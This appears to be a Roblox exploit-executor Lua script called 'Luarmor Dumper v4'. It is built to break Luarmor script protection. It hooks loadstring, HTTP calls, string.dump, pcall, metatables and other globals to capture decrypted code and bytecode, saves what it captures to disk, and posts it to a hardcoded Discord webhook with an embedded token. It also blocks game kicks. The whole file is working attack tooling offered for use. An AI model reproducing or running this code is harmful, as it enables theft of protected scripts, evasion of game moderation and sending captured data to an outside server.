--[[
    Luarmor Dumper v4 — Deep VM hooks
    Captures: metatable calls, coroutine, raw environment, pcall/xpcall results
]]

local WEBHOOK = "https://discord.com/api/webhooks/1512685201141272736/0i_pKRKISAT_DUXh6IuauiL4S9ZDsmz-xgv-kIXYBjjkScVG51e2iTgf_HsHaUJu-3Of"

local function send(msg)
    local body = game:GetService("HttpService"):JSONEncode({content = "```lua\n" .. msg:sub(1, 1900) .. "\n```"})
    local headers = {["Content-Type"] = "application/json"}
    pcall(function()
        if http_request then http_request({Url = WEBHOOK, Method = "POST", Headers = headers, Body = body})
        elseif request then request({Url = WEBHOOK, Method = "POST", Headers = headers, Body = body})
        elseif syn and syn.request then syn.request({Url = WEBHOOK, Method = "POST", Headers = headers, Body = body})
        end
    end)
end

local function saveFile(name, content)
    pcall(function()
        if not isfolder("luarmor_dump") then makefolder("luarmor_dump") end
        writefile("luarmor_dump/" .. name .. ".lua", tostring(content))
    end)
end

-- Snapshot current environment
local originalEnv = {}
local originalG = {}
pcall(function() for k, v in pairs(getfenv()) do originalEnv[k] = true end end)
pcall(function() for k, v in pairs(_G) do originalG[k] = true end end)

-- HOOK 1: loadstring
local oldLoadstring = loadstring
loadstring = function(code, name)
    if code and type(code) == "string" and #code > 50 then
        local n = name or ("ls_" .. tick():gsub("%.", ""))
        saveFile(n, code)
        send("[LOADSTRING] " .. n .. " (" .. #code .. " bytes)\n" .. code:sub(1, 1800))
    end
    return oldLoadstring(code, name)
end

-- HOOK 2: writefile
if writefile then
    local oldWritefile = writefile
    writefile = function(path, content)
        if content and type(content) == "string" and #content > 50 then
            send("[WRITEFILE] " .. path .. " (" .. #content .. " bytes)")
            saveFile("written_" .. path:gsub("[/\\]", "_"), content)
        end
        return oldWritefile(path, content)
    end
end

-- HOOK 3: __namecall for HTTP
pcall(function()
    if hookmetamethod and getnamecallmethod then
        local oldNamecall
        oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
            local method = getnamecallmethod()
            if method == "HttpGet" or method == "HttpGetAsync" then
                local args = {...}
                local url = args[1] or "unknown"
                local result = oldNamecall(self, ...)
                if result and type(result) == "string" and #result > 100 then
                    send("[HTTP] " .. url .. " (" .. #result .. " bytes)")
                    saveFile("http_" .. tostring(url):gsub("[^%w]", "_"):sub(1, 50), result)
                end
                return result
            end
            return oldNamecall(self, ...)
        end)
    end
end)

-- HOOK 4: string.dump
pcall(function()
    local oldDump = string.dump
    string.dump = function(fn, strip)
        local result = oldDump(fn, strip)
        if result and #result > 100 then
            send("[DUMP] " .. #result .. " bytes bytecode")
            saveFile("bc_" .. tick():gsub("%.", ""), result)
        end
        return result
    end
end)

-- HOOK 5: coroutine.create / coroutine.wrap
pcall(function()
    local oldCC = coroutine.create
    coroutine.create = function(fn)
        send("[COROUTINE_CREATE]")
        return oldCC(fn)
    end
    
    local oldCW = coroutine.wrap
    coroutine.wrap = function(fn)
        send("[COROUTINE_WRAP]")
        return oldCW(fn)
    end
end)

-- HOOK 6: pcall / xpcall (capture successful returns)
pcall(function()
    local oldPcall = pcall
    pcall = function(fn, ...)
        local results = {oldPcall(fn, ...)}
        if results[1] and type(results[2]) == "string" and #results[2] > 200 then
            send("[PCALL_OK] string result (" .. #results[2] .. " bytes)\n" .. results[2]:sub(1, 1500))
            saveFile("pcall_" .. tick():gsub("%.", ""), results[2])
        end
        return unpack(results)
    end
    
    local oldXpcall = xpcall
    xpcall = function(fn, handler, ...)
        local results = {oldXpcall(fn, handler, ...)}
        if results[1] and type(results[2]) == "string" and #results[2] > 200 then
            send("[XPCALL_OK] string result (" .. #results[2] .. " bytes)")
        end
        return unpack(results)
    end
end)

-- HOOK 7: getmetatable / setmetatable
pcall(function()
    local oldGetMT = getmetatable
    getmetatable = function(obj)
        local mt = oldGetMT(obj)
        if mt and type(mt) == "table" then
            -- Check for __call metamethod
            if mt.__call then
                pcall(function()
                    local dump = string.dump(mt.__call)
                    if dump and #dump > 200 then
                        send("[MT_CALL] __call metamethod (" .. #dump .. " bytes)")
                    end
                end)
            end
        end
        return mt
    end
end)

-- HOOK 8: newproxy (some VMs use this)
pcall(function()
    local oldNewproxy = newproxy
    newproxy = function(hasmt)
        send("[NEWPROXY]")
        return oldNewproxy(hasmt)
    end
end)

-- HOOK 9: Anti-kick
pcall(function()
    local Players = game:GetService("Players")
    Players.LocalPlayer.Kick = function(self, msg)
        send("[KICK_BLOCKED] " .. tostring(msg))
    end
end)

-- HOOK 10: task.spawn / task.delay / task.defer
pcall(function()
    local oldSpawn = task.spawn
    task.spawn = function(fn, ...)
        send("[TASK_SPAWN]")
        return oldSpawn(fn, ...)
    end
end)

-- Deep environment dump after 15 seconds
task.spawn(function()
    task.wait(15)
    
    send("=== ENVIRONMENT DUMP (15s) ===")
    
    -- Check _G for new entries
    local newGlobals = {}
    pcall(function()
        for k, v in pairs(_G) do
            if not originalG[k] then
                local vType = type(v)
                if vType == "function" then
                    pcall(function()
                        local d = string.dump(v)
                        table.insert(newGlobals, k .. " = function (" .. #d .. " bytes)")
                    end)
                elseif vType == "string" and #v > 50 then
                    table.insert(newGlobals, k .. " = string (" .. #v .. " bytes)")
                    saveFile("newg_" .. k, v)
                elseif vType == "table" then
                    local count = 0
                    for _ in pairs(v) do count = count + 1 end
                    table.insert(newGlobals, k .. " = table (" .. count .. " keys)")
                end
            end
        end
    end)
    
    if #newGlobals > 0 then
        send("[NEW_GLOBALS]\n" .. table.concat(newGlobals, "\n"))
    else
        send("[NEW_GLOBALS] none found")
    end
    
    -- Check getfenv for new entries
    local newEnv = {}
    pcall(function()
        for k, v in pairs(getfenv()) do
            if not originalEnv[k] then
                table.insert(newEnv, k .. " = " .. type(v))
                if type(v) == "string" and #v > 100 then
                    saveFile("env_" .. k, v)
                end
            end
        end
    end)
    
    if #newEnv > 0 then
        send("[NEW_ENV]\n" .. table.concat(newEnv, "\n"))
    end
    
    -- Dump static_content folder
    pcall(function()
        if isfolder("static_content_130525") then
            for _, file in ipairs(listfiles("static_content_130525")) do
                local content = readfile(file)
                if content and #content > 200 then
                    send("[CACHE] " .. file .. " (" .. #content .. " bytes)")
                    saveFile("cache_" .. file:gsub("[/\\]", "_"), content)
                end
            end
        end
    end)
    
    -- Try to find the loaded script in game
    pcall(function()
        for _, desc in ipairs(game:GetDescendants()) do
            if desc:IsA("LocalScript") or desc:IsA("ModuleScript") then
                local src = desc:GetAttribute("Source") or ""
                if #src > 200 then
                    send("[SCRIPT] " .. desc:GetFullName() .. " (" .. #src .. " bytes)")
                end
            end
        end
    end)
    
    send("=== DUMP COMPLETE ===")
end)

-- Confirmation
send("✅ DUMPER v4 ACTIVE\n\nDeep VM hooks:\n• loadstring, writefile\n• __namecall (HTTP)\n• string.dump (bytecode)\n• coroutine.create/wrap\n• pcall/xpcall returns\n• metatable __call\n• newproxy\n• task.spawn\n• anti-kick\n\nEnvironment dump in 15s.\nWaiting for Luarmor...")

pcall(function()
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "✅ Dumper v4 Active",
        Text = "Deep VM hooks installed! Execute Luarmor now.",
        Duration = 10
    })
end)

print("[Dumper v4] Deep hooks installed!")
